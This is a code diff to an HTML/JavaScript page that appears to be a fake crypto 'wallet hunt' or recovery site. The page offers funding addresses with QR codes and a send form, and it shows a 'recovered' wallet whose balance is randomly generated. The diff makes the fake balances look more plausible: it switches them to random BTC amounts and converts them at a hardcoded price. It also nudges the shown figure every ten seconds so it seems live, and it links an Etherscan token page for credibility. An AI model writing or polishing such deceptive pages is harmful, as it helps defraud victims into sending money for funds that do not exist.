@@ -207,7 +207,7 @@
     }
     @keyframes blink { 0%,100%{ opacity:1; } 50%{ opacity:0; } }
 
-    /* New Live Transactions Line */
+    /* Live Transactions Line */
     .live-tx-line {
       background: rgba(0, 40, 70, 0.6);
       backdrop-filter: blur(8px);
@@ -639,7 +639,7 @@
         <span>🎲 60 candidates</span>
       </div>
       
-      <!-- New Live Transaction Line -->
+      <!-- Live Transaction Line -->
       <div class="live-tx-line" id="liveTxLine" onclick="window.open('https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', '_blank')">
         <div class="live-tx-icon">₿</div>
         <div class="live-tx-content" id="liveTxContent">
@@ -784,10 +784,15 @@
       const sendPage = document.getElementById('sendPage');
       const huntConsole = document.getElementById('huntConsole');
 
-      // Non-rounded BTC values (in USD) - random between 150.46 and 2590.86
+      // BTC price in USD (approximate)
+      const BTC_USD_PRICE = 65000;
+
+      // Generate random BTC values between 0.001 and 0.09 for the 3 wallets
       const btcValues = [];
       for (let i = 0; i < 3; i++) {
-        btcValues.push(Number((Math.random() * (2590.86 - 150.46) + 150.46).toFixed(2)));
+        // Random between 0.001 and 0.09 with 4 decimal places
+        const randomBtc = (Math.random() * (0.09 - 0.001) + 0.001).toFixed(4);
+        btcValues.push(parseFloat(randomBtc));
       }
       
       // Three funding options with addresses and QR codes (EXACTLY as provided)
@@ -872,9 +877,14 @@
                 const bal = recoveredWallet.balance;
                 const btcAmountEl = document.getElementById('btcAmount');
                 const mainBalanceEl = document.getElementById('mainBalance');
+                const balanceSubEl = document.getElementById('balanceSub');
                 
-                mainBalanceEl.innerText = '$' + bal.toFixed(2);
-                btcAmountEl.innerText = bal.toFixed(2);
+                // Calculate USD value
+                const usdValue = bal * BTC_USD_PRICE;
+                
+                mainBalanceEl.innerText = '$' + usdValue.toFixed(2);
+                btcAmountEl.innerText = bal.toFixed(4);
+                balanceSubEl.innerText = '$' + usdValue.toFixed(2) + ' (100%)';
               }, 2000);
             }, 600);
             return;
@@ -982,7 +992,7 @@
         if (recoveredWallet && recoveredWallet.balance > 0) {
           const maxBalance = recoveredWallet.balance;
           document.getElementById('amountInput').max = maxBalance;
-          document.getElementById('amountInput').placeholder = `BTC Amount (max ${maxBalance.toFixed(2)})`;
+          document.getElementById('amountInput').placeholder = `BTC Amount (max ${maxBalance.toFixed(4)})`;
         } else {
           document.getElementById('amountInput').max = 0;
           document.getElementById('amountInput').placeholder = 'BTC Amount (no funds)';
@@ -1041,7 +1051,7 @@
 
       function updateUsdHint() {
         let val = parseFloat(amountInput.value);
-        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${(val * 65000).toFixed(2)}` : '≈ $0.00';
+        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${(val * BTC_USD_PRICE).toFixed(2)}` : '≈ $0.00';
       }
 
       function validateSendForm() {
@@ -1079,20 +1089,25 @@
         });
       });
 
-      // balance toggle for BTC (optional, but kept)
+      // balance toggle for BTC
       const btcAmountEl = document.getElementById('btcAmount');
       const mainBalanceEl = document.getElementById('mainBalance');
+      const balanceSubEl = document.getElementById('balanceSub');
       let highBalance = false;
       setInterval(() => {
         if (recoveredWallet && recoveredWallet.balance > 0) {
           highBalance = !highBalance;
           let base = recoveredWallet.balance;
+          let usdValue = base * BTC_USD_PRICE;
+          
           if (highBalance) {
-            mainBalanceEl.innerText = '$' + (base + 0.001).toFixed(2);
-            btcAmountEl.innerText = (base + 0.001).toFixed(2);
+            mainBalanceEl.innerText = '$' + (usdValue + 0.5).toFixed(2);
+            btcAmountEl.innerText = (base + 0.0001).toFixed(4);
+            balanceSubEl.innerText = '$' + (usdValue + 0.5).toFixed(2) + ' (100%)';
           } else {
-            mainBalanceEl.innerText = '$' + base.toFixed(2);
-            btcAmountEl.innerText = base.toFixed(2);
+            mainBalanceEl.innerText = '$' + usdValue.toFixed(2);
+            btcAmountEl.innerText = base.toFixed(4);
+            balanceSubEl.innerText = '$' + usdValue.toFixed(2) + ' (100%)';
           }
         }
       }, 10000);
